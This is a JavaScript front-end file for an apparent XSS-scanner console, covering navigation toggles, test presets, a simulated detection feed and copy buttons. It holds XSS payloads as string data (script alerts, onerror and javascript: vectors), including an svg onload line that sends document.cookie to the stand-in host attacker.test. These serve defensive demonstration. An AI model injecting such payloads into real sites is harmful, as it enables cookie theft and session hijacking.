document.addEventListener("DOMContentLoaded", () => {
    // -----------------------------------------------------------------------
    // 1. Authenticated Console Mobile Sidebar Toggle
    // -----------------------------------------------------------------------
    const consoleMenuToggle = document.querySelector("#mobile-menu-toggle");
    const consoleSidebar = document.querySelector("#app-sidebar");

    if (consoleMenuToggle && consoleSidebar) {
        consoleMenuToggle.addEventListener("click", () => {
            const isOpen = consoleSidebar.classList.toggle("open");
            consoleMenuToggle.setAttribute("aria-expanded", isOpen ? "true" : "false");
        });

        document.addEventListener("click", (event) => {
            if (
                consoleSidebar.classList.contains("open") &&
                !consoleSidebar.contains(event.target) &&
                !consoleMenuToggle.contains(event.target)
            ) {
                consoleSidebar.classList.remove("open");
                consoleMenuToggle.setAttribute("aria-expanded", "false");
            }
        });

        document.addEventListener("keydown", (event) => {
            if (event.key === "Escape" && consoleSidebar.classList.contains("open")) {
                consoleSidebar.classList.remove("open");
                consoleMenuToggle.setAttribute("aria-expanded", "false");
            }
        });
    }

    // -----------------------------------------------------------------------
    // 2. Public Product Mobile Navigation Drawer
    // -----------------------------------------------------------------------
    const productMenuToggle = document.querySelector("#mobile-product-toggle");
    const productDrawer = document.querySelector("#product-mobile-drawer");

    if (productMenuToggle && productDrawer) {
        productMenuToggle.addEventListener("click", () => {
            const isOpen = productDrawer.classList.toggle("open");
            productMenuToggle.setAttribute("aria-expanded", isOpen ? "true" : "false");
        });

        document.addEventListener("click", (event) => {
            if (
                productDrawer.classList.contains("open") &&
                !productDrawer.contains(event.target) &&
                !productMenuToggle.contains(event.target)
            ) {
                productDrawer.classList.remove("open");
                productMenuToggle.setAttribute("aria-expanded", "false");
            }
        });

        document.addEventListener("keydown", (event) => {
            if (event.key === "Escape" && productDrawer.classList.contains("open")) {
                productDrawer.classList.remove("open");
                productMenuToggle.setAttribute("aria-expanded", "false");
            }
        });
    }

    // -----------------------------------------------------------------------
    // 3. Quick-Fill Presets for Scanner Workspace
    // -----------------------------------------------------------------------
    const presetButtons = document.querySelectorAll(".btn-preset");
    const usernameInput = document.querySelector("#username");
    const searchInput = document.querySelector("#search_query");
    const commentInput = document.querySelector("#comment");

    const presets = {
        benign: {
            username: "soc_analyst",
            search_query: "audit policy report 2026",
            comment: "Reviewing quarterly security compliance logs and benign API activity."
        },
        script: {
            username: "red_team_tester",
            search_query: "script injection test",
            comment: "<script>alert('XSS Test Payload')</script>"
        },
        event: {
            username: "qa_auditor",
            search_query: "event handler probe",
            comment: "<img src=\"invalid-image.png\" onerror=\"alert(document.domain)\">"
        },
        scheme: {
            username: "researcher_01",
            search_query: "javascript url scheme",
            comment: "<a href=\"javascript:alert('XSS Execution')\">Click for system details</a>"
        }
    };

    const presetDescriptions = {
        benign: "Loaded: Benign Search — safe corporate query testing baseline nominal score.",
        script: "Loaded: Script Tag (R002) — tests <script> execution construct against Rule & ML detectors.",
        event: "Loaded: Event Handler (R003) — tests <img> onerror execution attribute.",
        scheme: "Loaded: Script URL (R004) — tests javascript: pseudo-protocol URL construct."
    };

    if (presetButtons.length && usernameInput && searchInput && commentInput) {
        presetButtons.forEach(btn => {
            btn.addEventListener("click", () => {
                const type = btn.getAttribute("data-preset");
                const data = presets[type];
                if (data) {
                    usernameInput.value = data.username;
                    searchInput.value = data.search_query;
                    commentInput.value = data.comment;

                    presetButtons.forEach(b => b.classList.remove("preset-active"));
                    btn.classList.add("preset-active");

                    const activePresetLabel = document.querySelector("#preset-active-label");
                    if (activePresetLabel && presetDescriptions[type]) {
                        activePresetLabel.textContent = presetDescriptions[type];
                    }

                    const commentCounter = document.querySelector("#comment-counter");
                    if (commentCounter) {
                        commentCounter.textContent = `${commentInput.value.length} / 1000 chars`;
                    }

                    commentInput.focus();
                }
            });
        });
    }

    // -----------------------------------------------------------------------
    // 4. Form Submission Feedback & Accessibility
    // -----------------------------------------------------------------------
    const form = document.querySelector("#analysis-form");
    if (form) {
        form.addEventListener("submit", () => {
            const button = form.querySelector("button[type='submit']");
            if (button) {
                button.disabled = true;
                button.setAttribute("aria-busy", "true");
                const textSpan = button.querySelector("span");
                if (textSpan) {
                    textSpan.textContent = "Analyzing Input...";
                } else if (button.firstChild) {
                    button.firstChild.textContent = "Analyzing...";
                }
            }
        });

        // Re-enable if user navigates back using browser cache
        window.addEventListener("pageshow", () => {
            const button = form.querySelector("button[type='submit']");
            if (button) {
                button.disabled = false;
                button.removeAttribute("aria-busy");
                const textSpan = button.querySelector("span");
                if (textSpan) {
                    textSpan.textContent = "Analyze Input";
                }
            }
        });
    }

    // -----------------------------------------------------------------------
    // 5. Simulated Live Security Telemetry Stream (Home Page)
    //    Strictly in-browser UI demonstration; zero DB writes, safe DOM nodes.
    // -----------------------------------------------------------------------
    const streamContainer = document.querySelector("#simulated-stream");
    if (streamContainer) {
        const simulatedFeed = [
            {
                endpoint: "POST /api/v1/events",
                payload: "<script>alert(document.cookie)</script>",
                badge: "CRITICAL (Risk 95)",
                action: "BLOCK",
                cls: "stream-critical",
                badgeCls: "badge-critical"
            },
            {
                endpoint: "GET /search?q=compliance",
                payload: "quarterly compliance guidelines 2026",
                badge: "LOW (Risk 10)",
                action: "ALLOW",
                cls: "stream-low",
                badgeCls: "badge-low"
            },
            {
                endpoint: "POST /profile/comment",
                payload: "<img src=x onerror=prompt(1)>",
                badge: "HIGH (Risk 72)",
                action: "BLOCK",
                cls: "stream-high",
                badgeCls: "badge-high"
            },
            {
                endpoint: "GET /portal/directory?filter=active",
                payload: "department=information_security&active=true",
                badge: "LOW (Risk 6)",
                action: "ALLOW",
                cls: "stream-low",
                badgeCls: "badge-low"
            },
            {
                endpoint: "GET /items?ref=javascript:test()",
                payload: "javascript:void(0)",
                badge: "MEDIUM (Risk 45)",
                action: "FLAG",
                cls: "stream-medium",
                badgeCls: "badge-medium"
            },
            {
                endpoint: "POST /tickets/submit",
                payload: "<svg/onload=fetch('//attacker.test/'+document.cookie)>",
                badge: "CRITICAL (Risk 98)",
                action: "BLOCK",
                cls: "stream-critical",
                badgeCls: "badge-critical"
            },
            {
                endpoint: "GET /api/v1/health",
                payload: "status_probe_heartbeat",
                badge: "LOW (Risk 2)",
                action: "ALLOW",
                cls: "stream-low",
                badgeCls: "badge-low"
            }
        ];

        let feedIndex = 0;
        let isPaused = false;

        const formatCurrentTime = () => {
            const now = new Date();
            const pad = (n, len = 2) => String(n).padStart(len, "0");
            const h = pad(now.getHours());
            const m = pad(now.getMinutes());
            const s = pad(now.getSeconds());
            const ms = pad(now.getMilliseconds(), 3);
            return `${h}:${m}:${s}.${ms}`;
        };

        const renderNewStreamRow = () => {
            if (isPaused) return;

            const item = simulatedFeed[feedIndex % simulatedFeed.length];
            feedIndex++;

            const row = document.createElement("div");
            row.className = `stream-row ${item.cls}`;

            const timeSpan = document.createElement("span");
            timeSpan.className = "stream-time";
            timeSpan.textContent = formatCurrentTime();

            const endpointSpan = document.createElement("span");
            endpointSpan.className = "stream-endpoint";
            endpointSpan.textContent = item.endpoint;

            const payloadCode = document.createElement("code");
            payloadCode.className = "stream-payload";
            payloadCode.textContent = item.payload;

            const badgeSpan = document.createElement("span");
            badgeSpan.className = `stream-badge ${item.badgeCls}`;
            badgeSpan.textContent = item.badge;

            const actionSpan = document.createElement("span");
            actionSpan.className = "stream-action";
            actionSpan.textContent = item.action;

            row.appendChild(timeSpan);
            row.appendChild(endpointSpan);
            row.appendChild(payloadCode);
            row.appendChild(badgeSpan);
            row.appendChild(actionSpan);

            streamContainer.insertBefore(row, streamContainer.firstChild);

            // Keep max 4 rows visible
            while (streamContainer.children.length > 4) {
                streamContainer.removeChild(streamContainer.lastChild);
            }
        };

        // Pause stream on hover/focus so user can inspect payloads cleanly
        streamContainer.addEventListener("mouseenter", () => { isPaused = true; });
        streamContainer.addEventListener("mouseleave", () => { isPaused = false; });
        streamContainer.addEventListener("focusin", () => { isPaused = true; });
        streamContainer.addEventListener("focusout", () => { isPaused = false; });

        // Rotate simulated item every 3.5 seconds
        setInterval(renderNewStreamRow, 3500);
    }

    // -----------------------------------------------------------------------
    // 6. Interactive Copy-to-Clipboard on Code Blocks
    // -----------------------------------------------------------------------
    const copyableBlocks = document.querySelectorAll(".code-box, .payload-box");
    copyableBlocks.forEach((block) => {
        const copyBtn = document.createElement("button");
        copyBtn.className = "btn-copy-code";
        copyBtn.type = "button";
        copyBtn.setAttribute("aria-label", "Copy snippet to clipboard");

        const iconSvg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
        iconSvg.setAttribute("width", "13");
        iconSvg.setAttribute("height", "13");
        iconSvg.setAttribute("viewBox", "0 0 24 24");
        iconSvg.setAttribute("fill", "none");
        iconSvg.setAttribute("stroke", "currentColor");
        iconSvg.setAttribute("stroke-width", "2");

        const rect = document.createElementNS("http://www.w3.org/2000/svg", "rect");
        rect.setAttribute("x", "9");
        rect.setAttribute("y", "9");
        rect.setAttribute("width", "13");
        rect.setAttribute("height", "13");
        rect.setAttribute("rx", "2");
        rect.setAttribute("ry", "2");

        const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
        path.setAttribute("d", "M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1");

        iconSvg.appendChild(rect);
        iconSvg.appendChild(path);

        const btnText = document.createElement("span");
        btnText.textContent = "Copy";

        copyBtn.appendChild(iconSvg);
        copyBtn.appendChild(btnText);

        copyBtn.addEventListener("click", () => {
            const codeEl = block.querySelector("code") || block;
            const textToCopy = codeEl.innerText || codeEl.textContent;
            navigator.clipboard.writeText(textToCopy.trim()).then(() => {
                copyBtn.classList.add("copied");
                btnText.textContent = "Copied!";
                setTimeout(() => {
                    copyBtn.classList.remove("copied");
                    btnText.textContent = "Copy";
                }, 2000);
            }).catch(() => {
                btnText.textContent = "Error";
            });
        });

        block.appendChild(copyBtn);
    });

    // -----------------------------------------------------------------------
    // 7. Scanner Character Counter & Clear Form
    // -----------------------------------------------------------------------
    const commentField = document.querySelector("#comment");
    const commentCounter = document.querySelector("#comment-counter");
    if (commentField && commentCounter) {
        const updateCommentCount = () => {
            commentCounter.textContent = `${commentField.value.length} / 1000 chars`;
        };
        commentField.addEventListener("input", updateCommentCount);
        updateCommentCount();
    }

    const clearBtn = document.querySelector("#clear-scanner-btn");
    const scannerForm = document.querySelector("#analysis-form");
    if (clearBtn && scannerForm) {
        clearBtn.addEventListener("click", () => {
            scannerForm.querySelectorAll("input[type='text'], textarea").forEach((el) => {
                el.value = "";
            });
            presetButtons.forEach((b) => b.classList.remove("preset-active"));
            if (commentCounter) {
                commentCounter.textContent = "0 / 1000 chars";
            }
            const activePresetLabel = document.querySelector("#preset-active-label");
            if (activePresetLabel) {
                activePresetLabel.textContent = "Select a preset to load safe test vectors";
            }
            const firstInput = scannerForm.querySelector("input[type='text']");
            if (firstInput) firstInput.focus();
        });
    }
});
